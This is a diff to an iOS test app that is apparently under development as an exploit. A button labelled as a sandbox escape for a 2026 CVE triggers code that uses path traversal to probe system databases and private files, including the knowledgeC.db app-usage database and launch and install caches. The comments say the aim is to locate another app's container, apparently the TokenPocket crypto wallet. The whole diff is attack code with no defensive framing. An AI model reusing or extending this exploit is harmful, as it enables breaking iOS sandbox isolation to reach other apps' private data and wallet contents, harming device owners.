@@ -662,7 +662,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v4" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v5" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7254,112 +7254,81 @@ static void *iohid_threadCopyEvent(void *arg) {
     }
 
     // ============================================================
-    // v4: Probe SpringBoard + system app databases for bundleID→UUID
+    // v5: Probe specific DB files in known-existing directories
+    // Strategy: directory listing blocked, so guess filenames
     // ============================================================
 
     #define BASE @"../../../../../../../../../../../../../"
+    #define TRYFILE(path) [[BASE stringByAppendingString:path] stringByExpandingTildeInPath]
 
-    // Test 2: SpringBoard plists (icon layout = installed apps)
-    [log appendString:@"--- Test 2: SpringBoard plists ---\n"];
-    NSArray *sbPaths = @[
-        @"var/mobile/Library/SpringBoard/IconState.plist",
-        @"var/mobile/Library/SpringBoard/IconData.plist",
-        @"var/mobile/Library/SpringBoard/DesiredIconState.plist",
-        @"var/mobile/Library/SpringBoard/ApplicationShortcuts/",
-        @"var/mobile/Library/SpringBoard/Recents/",
-        @"var/mobile/Library/FrontBoard/applicationState.plist",
-    ];
-    for (NSString *sub in sbPaths) {
-        NSString *p = [[BASE stringByAppendingString:sub] stringByExpandingTildeInPath];
+    // helper: probe a specific file, print size if found
+    BOOL (^probeFile)(NSString*, NSMutableString*) = ^BOOL(NSString *sub, NSMutableString *out) {
+        NSString *p = TRYFILE(sub);
         BOOL ex = [fm fileExistsAtPath:p];
         if (ex) {
-            id obj = [NSDictionary dictionaryWithContentsOfFile:p];
-            if (!obj) obj = [NSArray arrayWithContentsOfFile:p];
-            if (!obj) {
-                NSError *err = nil;
-                obj = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:&err];
-                if (obj) obj = [@"text:" stringByAppendingString:[(NSString*)obj substringToIndex:MIN(200, [(NSString*)obj length])]];
+            NSDictionary *attrs = [fm attributesOfItemAtPath:p error:nil];
+            unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
+            [out appendFormat:@"  [+] %@ (%llu bytes)\n", sub, sz];
+            // if plist, try to parse and show keys
+            if ([sub hasSuffix:@".plist"]) {
+                NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:p];
+                if (d) {
+                    [out appendFormat:@"      keys: %@\n", [[d allKeys] componentsJoinedByString:@", "]];
+                }
             }
-            [log appendFormat:@"  [+] %@: %@\n", [sub lastPathComponent],
-                [obj isKindOfClass:[NSDictionary class]] ? [NSString stringWithFormat:@"plist %lu keys", (unsigned long)[(NSDictionary*)obj count]] :
-                [obj isKindOfClass:[NSArray class]] ? [NSString stringWithFormat:@"array %lu items", (unsigned long)[(NSArray*)obj count]] :
-                [obj isKindOfClass:[NSString class]] ? (NSString*)obj : @"unknown"];
         } else {
-            [log appendFormat:@"  [-] %@\n", sub];
+            [out appendFormat:@"  [-] %@\n", sub];
         }
-    }
+        return ex;
+    };
 
-    // Test 3: containermanagerd / installd state
-    [log appendString:@"\n--- Test 3: Container manager state ---\n"];
-    NSArray *cmPaths = @[
-        @"var/db/containermanager/",
-        @"var/containermanagerd/",
-        @"private/var/db/containermanagerd/",
-        @"var/mobile/Library/Caches/com.apple.containermanagerd/",
-        @"var/mobile/Library/Caches/com.apple.mobile.installation.plist",
-        @"var/mobile/Library/Caches/com.apple.MobileInstallation/",
-    ];
-    for (NSString *sub in cmPaths) {
-        NSString *p = [[BASE stringByAppendingString:sub] stringByExpandingTildeInPath];
-        BOOL ex = [fm fileExistsAtPath:p];
-        [log appendFormat:@"  %@ %@\n", ex ? @"[+]" : @"[-]", sub];
-        if (ex && [sub hasSuffix:@".plist"]) {
-            NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:p];
-            if (d) [log appendFormat:@"    plist: %lu keys\n", (unsigned long)d.count];
-        }
-    }
+    // Test 2: SpringBoard preferences (iOS 26 may use NSUserDefaults plist instead of IconState)
+    [log appendString:@"--- Test 2: SpringBoard prefs & DBs ---\n"];
+    probeFile(@"var/mobile/Library/Preferences/com.apple.springboard.plist", log);
+    probeFile(@"var/mobile/Library/Preferences/com.apple.frontboard.plist", log);
+    probeFile(@"var/mobile/Library/SpringBoard/IconState.db", log);
+    probeFile(@"var/mobile/Library/SpringBoard/SpringBoard.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.springboard/Cache.db", log);
 
-    // Test 4: Duet / CoreDuet / AppPrediction (Siri app suggestions)
-    [log appendString:@"\n--- Test 4: Duet / AppPrediction DBs ---\n"];
-    NSArray *duetPaths = @[
-        @"var/mobile/Library/Duet/",
-        @"var/mobile/Library/CoreDuet/",
-        @"var/mobile/Library/AppPrediction/",
-        @"var/mobile/Library/Caches/com.apple.duetexpertd/",
-        @"var/mobile/Library/Caches/com.apple.AppPrediction/",
-    ];
-    for (NSString *sub in duetPaths) {
-        NSString *p = [[BASE stringByAppendingString:sub] stringByExpandingTildeInPath];
-        BOOL ex = [fm fileExistsAtPath:p];
-        [log appendFormat:@"  %@ %@\n", ex ? @"[+]" : @"[-]", sub];
-    }
+    // Test 3: containermanagerd — try specific DB filenames
+    [log appendString:@"\n--- Test 3: containermanagerd DB files ---\n"];
+    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/Cache.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/cache.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/containers.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/store.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/db.sqlite", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.containermanagerd/containermanagerd.sqlite", log);
 
-    // Test 5: iTunes / App Store metadata
-    [log appendString:@"\n--- Test 5: App Store / iTunes metadata ---\n"];
-    NSArray *storePaths = @[
-        @"var/mobile/Library/Caches/com.apple.appstored/",
-        @"var/mobile/Media/iTunes_Control/iTunes/",
-        @"var/mobile/Library/Caches/com.apple.iTunesStore/",
-    ];
-    for (NSString *sub in storePaths) {
-        NSString *p = [[BASE stringByAppendingString:sub] stringByExpandingTildeInPath];
-        BOOL ex = [fm fileExistsAtPath:p];
-        [log appendFormat:@"  %@ %@\n", ex ? @"[+]" : @"[-]", sub];
-        if (ex) {
-            // Try to list contents (may fail due to dir enumeration block)
-            NSError *err = nil;
-            NSArray *items = [fm contentsOfDirectoryAtPath:p error:&err];
-            if (items.count > 0) {
-                [log appendFormat:@"    contents: %@\n",
-                    [[items subarrayWithRange:NSMakeRange(0, MIN(10, items.count))] componentsJoinedByString:@", "]];
-            }
-        }
-    }
+    // Test 4: CoreDuet Knowledge DB (well-known path, stores app interactions)
+    [log appendString:@"\n--- Test 4: CoreDuet Knowledge DB ---\n"];
+    probeFile(@"var/mobile/Library/CoreDuet/Knowledge/knowledgeC.db", log);
+    probeFile(@"var/mobile/Library/CoreDuet/knowledgeC.db", log);
+    probeFile(@"var/mobile/Library/CoreDuet/Knowledge/People/knowledgeC.db", log);
 
-    // Test 6: Try known TokenPocket container metadata patterns
-    [log appendString:@"\n--- Test 6: TokenPocket bundle container ---\n"];
-    // App bundle containers use a different UUID than data containers,
-    // but the bundle .app directory name reveals the app identity
-    // Try reading the AppDomain (bundle) metadata
-    NSArray *bundlePaths = @[
-        @"var/containers/Bundle/Application/",
-        @"private/var/containers/Bundle/Application/",
-    ];
-    for (NSString *sub in bundlePaths) {
-        NSString *p = [[BASE stringByAppendingString:sub] stringByExpandingTildeInPath];
-        BOOL ex = [fm fileExistsAtPath:p];
-        [log appendFormat:@"  %@ %@\n", ex ? @"[+] EXISTS" : @"[-] no", sub];
-    }
+    // Test 5: LaunchServices (lsd) — maintains bundleID→path mapping
+    [log appendString:@"\n--- Test 5: LaunchServices (lsd) ---\n"];
+    probeFile(@"var/mobile/Library/Caches/com.apple.lsd/Cache.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.lsd/lsd.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.LaunchServices/Cache.db", log);
+    probeFile(@"var/db/lsd/lsd.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.MobileCoreServices/Cache.db", log);
+
+    // Test 6: appstored / iTunes — try specific cache files
+    [log appendString:@"\n--- Test 6: appstored / iTunes cache files ---\n"];
+    probeFile(@"var/mobile/Library/Caches/com.apple.appstored/Cache.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.appstored/appstored.sqlite", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.appstored/store.db", log);
+    probeFile(@"var/mobile/Library/Caches/com.apple.iTunesStore/Cache.db", log);
+    probeFile(@"var/mobile/Media/iTunes_Control/iTunes/iTunesMetadata.plist", log);
+    probeFile(@"var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb", log);
+
+    // Test 7: Bundle container structure — verify our own app path to confirm access pattern
+    // If we can read our own container metadata, we can find patterns for finding TP's
+    [log appendString:@"\n--- Test 7: Bundle container access pattern ---\n"];
+    probeFile(@"var/containers/Bundle/Application/D52DD906-E0A3-41DD-89B4-D0345C6438E1/.com.apple.mobile_container_manager.metadata.plist", log);
+    probeFile(@"var/containers/Bundle/Application/D52DD906-E0A3-41DD-89B4-D0345C6438E1/iTunesMetadata.plist", log);
+    // Try reading our own data container metadata
+    probeFile(@"var/mobile/Containers/Data/Application/D52DD906-E0A3-41DD-89B4-D0345C6438E1/.com.apple.mobile_container_manager.metadata.plist", log);
 
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 }
